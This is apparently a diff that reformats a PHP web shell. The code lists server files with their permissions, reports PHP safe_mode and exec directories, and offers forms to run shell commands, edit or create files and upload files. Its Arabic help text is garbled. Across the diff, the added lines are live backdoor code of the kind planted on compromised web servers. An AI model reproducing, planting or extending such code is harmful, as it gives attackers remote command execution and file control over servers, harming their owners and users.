+            $directory = $directory . "<tr><td>$filename</td><td>" . filetype($filename) . "</td><td></td><td>" . date("G:i j M Y", fileatime($filename)) . "</td><td>" . date("G:i j M Y", filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
+            if (is_writable($filename) == true) {
+                $directory = $directory . "<td>Yes</td>";
+            } else {
+                $directory = $directory . "<td>No</td>";
+            }
 
-if ($filename != "." and $filename != ".."){
+            if (is_readable($filename) == true) {
+                $directory = $directory . "<td>Yes</td>";
+            } else {
+                $directory = $directory . "<td>No</td>";
+            }
+            $dires = $dires . $directory;
+        }
 
-if (is_dir($filename) == true){
-$directory = "";
-$directory = $directory . "<tr><td>$filename</td><td>" . filetype($filename) . "</td><td></td><td>" . date("G:i j M Y",fileatime($filename)) . "</td><td>" . date("G:i j M Y",filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
-if (is_writable($filename) == true){
-$directory = $directory . "<td>Yes</td>";}
-else{
-$directory = $directory . "<td>No</td>";
+        if (is_file($filename) == true) {
+            $file = "";
+            $file = $file . "<tr><td><a onclick=tag('$filename')>$filename</a></td><td>" . filetype($filename) . "</td><td>" . filesize($filename) . "</td><td>" . date("G:i j M Y", fileatime($filename)) . "</td><td>" . date("G:i j M Y", filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
+            if (is_writable($filename) == true) {
+                $file = $file . "<td>Yes</td>";
+            } else {
+                $file = $file . "<td>No</td>";
+            }
 
-}
-
-if (is_readable($filename) == true){
-$directory = $directory . "<td>Yes</td>";}
-else{
-$directory = $directory . "<td>No</td>";
-}
-$dires = $dires . $directory;
-}
-
-if (is_file($filename) == true){
-$file = "";
-$file = $file . "<tr><td><a onclick=tag('$filename')>$filename</a></td><td>" . filetype($filename) . "</td><td>" . filesize($filename) . "</td><td>" . date("G:i j M Y",fileatime($filename)) . "</td><td>" . date("G:i j M Y",filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
-if (is_writable($filename) == true){
-$file = $file . "<td>Yes</td>";}
-else{
-$file = $file . "<td>No</td>";
-}
-
-if (is_readable($filename) == true){
-$file = $file . "<td>Yes</td></td></tr>";}
-else{
-$file = $file . "<td>No</td></td></tr>";
-}
-$files = $files . $file;
-}
-
-
-
-}
-
-
-
+            if (is_readable($filename) == true) {
+                $file = $file . "<td>Yes</td></td></tr>";
+            } else {
+                $file = $file . "<td>No</td></td></tr>";
+            }
+            $files = $files . $file;
+        }
+    }
 }
 echo $dires;
 echo $files;
@@ -817,9 +823,11 @@ echo "\">
 
 
 
-if (ini_get('safe_mode') == 1){echo "<br><font size=\"3\"color=\"#cc0000\"><b>SAFE MOD IS ON<br>
+if (ini_get('safe_mode') == 1) {
+    echo "<br><font size=\"3\"color=\"#cc0000\"><b>SAFE MOD IS ON<br>
 Including from here: "
-. ini_get('safe_mode_include_dir') . "<br>Exec here: " . ini_get('safe_mode_exec_dir'). "</b></font>";}
+. ini_get('safe_mode_include_dir') . "<br>Exec here: " . ini_get('safe_mode_exec_dir'). "</b></font>";
+}
 
 
 
@@ -829,8 +837,8 @@ Including from here: "
 	<b>
 	:: </b>
 	<font face=Verdana size=-2><a href="?act=command">Executed command</a></font><b> ::</b></p></td></tr><tr><td width="50%" height="1" valign="top" bgcolor="#000000" style="color: #000000; border: 1px solid #000000"><center><b>
-	<?
-	echo "
+	<?php
+    echo "
 <form action=\"$REQUEST_URI\" method=\"POST\">
 Command:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\">";
 ?>
@@ -885,13 +893,15 @@ Command:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\">";
 	<a style="font-weight: normal; font-family: verdana; text-decoration: none" bookmark="minipanel">
 	<font face="verdana" size="2" color="#DCE7EF">::</font></a></font></b><a href="?act=edit" bookmark="minipanel"><span lang="en-us"><font face="Verdana" size="2">Edit/Create
 	file</font></span></a><b><font face="verdana" color="red" size="4"><a style="font-weight: normal; font-family: verdana; text-decoration: none" bookmark="minipanel"><font face="verdana" size="2" color="#DCE7EF">::</font></a></font></b><font face="Wingdings 2" size="2">&quot;</font></p><p align="center">
-	&nbsp;<?
-if ($act == "edit") {echo "<center><b>«· Õ—Ì— Ê«·«‰‘«¡:<br><br> ﬁ„ »Ê÷⁄ «”„ «·„·› «·–Ì  —Ìœ  Õ—Ì—Â ›ﬁÿ<br>Ê»⁄œ –«·ﬂ «·÷€ÿ ⁄·Ï config.php „À«·<br>Edit<br>” ŸÂ— ·ﬂ ‰«›–Â »Â« „Õ ÊÌ«  «·„·› <br>Ê«Ì÷«  «–« «—œ  «‰‘«¡ „·› ›ﬁÿ ÷⁄ «”„Â „⁄ «·«„ œ«œ <br>Ê»⁄œ –«·ﬂ «ﬂ » „« —Ìœ washer-crystal.txt   </a>.</b>";}
+	&nbsp;<?php
+if ($act == "edit") {
+    echo "<center><b>«· Õ—Ì— Ê«·«‰‘«¡:<br><br> ﬁ„ »Ê÷⁄ «”„ «·„·› «·–Ì  —Ìœ  Õ—Ì—Â ›ﬁÿ<br>Ê»⁄œ –«·ﬂ «·÷€ÿ ⁄·Ï config.php „À«·<br>Edit<br>” ŸÂ— ·ﬂ ‰«›–Â »Â« „Õ ÊÌ«  «·„·› <br>Ê«Ì÷«  «–« «—œ  «‰‘«¡ „·› ›ﬁÿ ÷⁄ «”„Â „⁄ «·«„ œ«œ <br>Ê»⁄œ –«·ﬂ «ﬂ » „« —Ìœ washer-crystal.txt   </a>.</b>";
+}
 ?>
 	</p>
 	<p>&nbsp;</p>
-	<p>	<?
-	echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
+	<p>	<?php
+    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
 File to edit:
 <input type=\"text\" name=\"editfile\" >
 <INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
@@ -900,14 +910,16 @@ File to edit:
 	</p>
 	</form></center></p></td>
  <td width="50%" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
-                 <?
-if ($act == "upload") {echo "<center><b>—›⁄ «·„·›« :<br><br>ﬁ„ » ÕœÌœ «·„·› «·„—«œ —›⁄Â <br>Ê»⁄œ –«·ﬂ ﬁ„ »«·÷€ÿ ⁄·Ï «·ŒÌ«— «·„Ê÷Õ<br>UPLOAD< </a>.</b>";}
+                 <?php
+if ($act == "upload") {
+    echo "<center><b>—›⁄ «·„·›« :<br><br>ﬁ„ » ÕœÌœ «·„·› «·„—«œ —›⁄Â <br>Ê»⁄œ –«·ﬂ ﬁ„ »«·÷€ÿ ⁄·Ï «·ŒÌ«— «·„Ê÷Õ<br>UPLOAD< </a>.</b>";
+}
 ?><a bookmark="minipanel"><b><font size="2">::
 	</font>
 	</b><a href="?act=upload"><span lang="en-us"><font face="Verdana" size="2">
 					upload</font></span></a><b><font size="2">::</font></b><font face=Webdings size=2>&#325;</font><font size="2"></a></a></font><br><form method="POST" ENCTYPE="multipart/form-data"><input type="hidden" name="miniform" value="1"><input type="hidden" name="act" value="upload">&nbsp;
-		<?
-		echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
+		<?php
+        echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
 <INPUT type=\"file\" name=\"userfile\">
 <INPUT type=\"hidden\" name=\"post\" value=\"yes\">
 <INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
